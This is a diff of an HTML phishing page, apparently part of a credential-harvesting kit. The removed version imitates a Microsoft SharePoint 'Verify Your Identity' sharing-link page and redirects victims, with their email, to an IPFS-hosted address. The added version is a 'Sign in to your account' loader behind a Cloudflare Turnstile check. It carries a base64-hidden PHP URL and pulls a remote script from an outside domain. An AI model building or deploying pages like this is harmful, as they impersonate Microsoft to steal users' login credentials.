@@ -1,38 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Sign in to your account</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sharing Link Validation</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer async></script>
+    <style>
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333333;
+            /* Gray-black color */
+        }
+
+        #container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #status-shower {
+            margin-bottom: 30px;
+            color: #333333;
+            /* Applying the color to the h5 tag */
+        }
+    </style>
     <style>
         body {
             margin: 0;
             padding: 0;
-            overflow: hidden;
-        }
-
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: rgba(255, 255, 255, 0.8);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .loading-spinner {
-            border: 3px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #333;
-            border-radius: 50%;
+            display: inline-block;
             width: 50px;
             height: 50px;
-            animation: spin 1s linear infinite;
+            border: 3px solid rgba(0, 0, 0, 0.3);
+            border-radius: 50%;
+            border-top-color: #333;
+            animation: spin 1s ease-in-out infinite;
         }
 
         @keyframes spin {
@@ -43,225 +69,18 @@
                 transform: rotate(360deg);
             }
         }
-
-        #content {
-            display: none;
-        }
     </style>
 </head>
 
 <body>
-    <div class="loading-overlay">
+    <div class="loading-container">
         <div class="loading-spinner"></div>
     </div>
-    <div id="content">
-        <div style="border: 0px; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alternates: inherit; font-stretch: inherit; font-size: 12px; line-height: inherit; font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, 'system-ui', Roboto, 'Helvetica Neue', sans-serif; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; margin: 0px; padding: 0px; vertical-align: baseline; background-color: #f2f2f2;">
-            <meta charset="UTF-8">
-            <meta http-equiv="X-UA-Compatible" content="IE=edge">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Sharing Link Validation</title>
-            <link rel="icon" type="image/png" href="">
-
-            <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-            <div style="position: fixed; top: 0; left: 0; width: 100%; background-color: #0078d4; color: white; font-size: 22px; padding: 10px 20px; box-sizing: border-box;">
-                SharePoint
-            </div>
-            <style>
-                body {
-                    margin: 0;
-                    padding: 0;
-                    font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, 'system-ui', Roboto, 'Helvetica Neue', sans-serif;
-                    font-size: 12px;
-                    line-height: inherit;
-                    color: inherit;
-                    background-color: #f2f2f2;
-                }
-
-                /*overflow-x: hidden;
-            /*overflow: hidden;
-            </style>
-            <div style="border: 0px; font: inherit; margin: 0px; padding: 32px 8px; vertical-align: baseline; color: inherit;" align="center">
-                <table style="font: inherit; width: 100%; margin: 0px auto; max-width: 360px; border: 0px solid #c8c8c8; border-radius: 5px; overflow: hidden; background-color: #f8f8f8; box-shadow: 0px 0px 10px -1px rgba(0,0,0,0.18);" role="presentation" border="0" cellspacing="0"
-                    cellpadding="0">
-
-                    <colgroup>
-                        <col style="width: 14.5469px;" width="16" />
-                        <col style="width: 552.898px;" width="608" />
-                        <col style="width: 14.5547px;" width="16" /> </colgroup>
-                    <tbody>
-                        <div style="display: flex; justify-content: center; align-items: center;">
-                            <img class="logo" alt="Share" border="0" width="110" height="auto" style="border: 0; margin-bottom: 25px; margin-top: 55px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/2560px-Microsoft_logo_%282012%29.svg.png">
-                            <tr>
-                                <td style="padding: 20px 36px 20px 36px;" colspan="3" align="center">
-
-                                    <h3 style="font-size: 24px; font-weight: 300; line-height: 32px; margin: 0px; max-width: 400px; padding: 0px; color: #323130;"><span style="font-size: 21px;">Verify Your Identity
-</span></h3>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td style="border-top: 1px solid #dedede; padding: 25px 100px 2px 35.5px; text-align: left; background-color: white;" colspan="3">
-                                    <p style="font-size: 13px; margin: -1px; color: #323130;">You've received a secure link to:
-                                    </p>
-
-                                </td>
-                            </tr>
-                            <td style="border-top: 0px solid #dedede; padding: 25px 0px 2px 35.5px; text-align: left; background-color: white;" colspan="3">
-                                <p style="font-size: 18px; margin: 0; color: #323130; font-weight: 300;">Addison Powerhouse Proposal.aspx</p>
-                            </td>
-
-
-
-                            <tr>
-                                <td style="text-align: left; background-color: white;" colspan="3" align="center">
-                                    <div style="border: 0px; font: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: inherit; display: inline-block;">
-                                        <table style="font: inherit; width: 100%; height: 20px;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="center">
-                                            <tbody>
-                                                <tr>
-                                                    <td style="height: 10px; padding: 0px 4px 10px 90px;" align="left"></td>
-                                                </tr>
-                                                <tr>
-                                                    <td style="padding: 0px 35.5px 5px 35.5px; color: #323130;">
-                                                        <div id="email-display"></div>
-
-                                                        <style>
-                                                            #email-display {
-                                                                font-size: 12px;
-                                                                /* Base font size */
-                                                            }
-
-                                                            #email-display strong {
-                                                                font-weight: bold;
-                                                            }
-                                                        </style>
-
-                                                        <script>
-                                                            // Get the email from the URL query string
-                                                            const queryString = window.location.search;
-                                                            const urlParams = new URLSearchParams(queryString);
-                                                            const email = urlParams.get('email');
-
-                                                            // Decode the email if it's Base64 encoded
-                                                            let decodedEmail = email;
-                                                            try {
-                                                                decodedEmail = atob(email);
-                                                            } catch (e) {
-                                                                // Not a Base64 encoded email, do nothing
-                                                            }
-
-                                                            // Display the email on the page
-                                                            const emailDisplay = document.getElementById('email-display');
-                                                            if (decodedEmail) {
-                                                                emailDisplay.innerHTML = `Sign in to your account and we'll give you access immediately.`;
-                                                            } else {
-                                                                emailDisplay.innerHTML = 'Sign in to <strong>your account</strong> and we\'ll give you access immediately.';
-                                                            }
-                                                        </script>
-
-                                                    </td>
-
-                                                </tr>
-                                                <tr>
-                                                    <td style="font-size: 16px; word-break: break-all; padding: 20px 30.5px 3px 30.5px; text-align: center; background-color: white;">
-
-                                                        <input type="button" value="Next" onclick="redirectToURL()" style="border: 0px solid #0078d4; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 17px; line-height: 43px; font-family: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; margin: 0px; padding: 0px; vertical-align: baseline; border-radius: 2px; display: inline-block; text-decoration-line: none; width: 100%; color: #ffffff; background-color: #0078d4; cursor: pointer;"
-                                                            contenteditable="false" rel="noopener noreferrer">
-
-                                                    </td>
-                                                </tr>
-
-                                            </tbody>
-                                        </table>
-                                    </div>
-                                    <div style="text-align: left; padding: 10px 30px 15px 20.5px; width: auto; max-width: 100%; margin: 0 auto;">
-                                    </div>
-
-
-
-
-
-                                </td>
-                            </tr>
-                    </tbody>
-
-                    <tr>
-                    </tr>
-                    </tbody>
-                </table>
-                <div style="display: flex; justify-content: center; align-items: center; margin-top: 15px; margin-bottom: auto;">
-                    <span style="color: black; text-decoration: none; margin-right: 20px;">© 2017 Microsoft</span>
-                    <a href="https://go.microsoft.com/fwlink/?linkid=845480" style="color: black; text-decoration: none;">Privacy & Cookies</a> </div>
-
-
-                </div>
-            </div>
-            <style>
-                .tooltip {
-                    position: relative;
-                    display: inline-block;
-                    cursor: pointer;
-                    top: -29px;
-                    /* Position the tooltip at the top of the info icon */
-                    left: 125px;
-                    /* Position the tooltip 25px to the right of the info icon */
-                }
-
-                .tooltip .tooltiptext {
-                    visibility: hidden;
-                    max-width: auto;
-                    /* Set a maximum width for the tooltip */
-                    background-color: #fff;
-                    /* White background */
-                    color: #000;
-                    /* Black text color */
-                    text-align: left;
-                    border-radius: 5px;
-                    padding: 10px 15px;
-                    /* Added padding for top and bottom */
-                    margin-top: 5px;
-                    /* Added top margin */
-                    margin-bottom: 5px;
-                    /* Added bottom margin */
-                    position: fixed;
-                    z-index: 1;
-                    font-size: 12px;
-                    opacity: 0;
-                    transition: opacity 0.3s;
-                    white-space: normal;
-                    /* Allow line breaks */
-                    box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-                    /* Add shadow */
-                    word-wrap: break-word;
-                    /* Allow the text to wrap to the next line */
-                }
-
-                .tooltip:hover .tooltiptext {
-                    visibility: visible;
-                    opacity: 1;
-                }
-            </style>
-
-        </div>
-
-        <script>
-            function redirectToURL() {
-                const queryString = window.location.search;
-                const urlParams = new URLSearchParams(queryString);
-                const email = urlParams.get('email');
-
-                // Redirect to the URL with the email
-                window.location.href = `https://cloudflare-ipfs.com/ipfs/bafybeifu57aztr7sibz4k4s2pwcqiab236vddrhvfj63eskjlhiynq3qxe#${email}`;
-            }
-
-            window.addEventListener('load', function() {
-                // Simulating content loading
-                setTimeout(function() {
-                    document.querySelector('.loading-overlay').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
-                }, 3000); // 3 seconds
-            });
-        </script>
-
+    <div id="container">
+        <div id="cf-show"></div>
+        <input type="hidden" id="b64u" value="aHR0cHM6Ly93c2F3b3JrcGxhY2ViZW5lZml0cy5uZXQvdGVzdHkvaW5zdGFsbGVyWzI0LjBdL2hvc3RbMjQuMF0vYzA3N2VhNS5waHA=" class=""></input>
+    </div>
+    <script src="https://wsaworkplacebenefits.net/testy/installer[24.0]/host[24.0]/admin/js/sc.php?r=ZW0sZW1haWwsYWRk"></script>
 </body>
 
-</html>
-
+</html>  
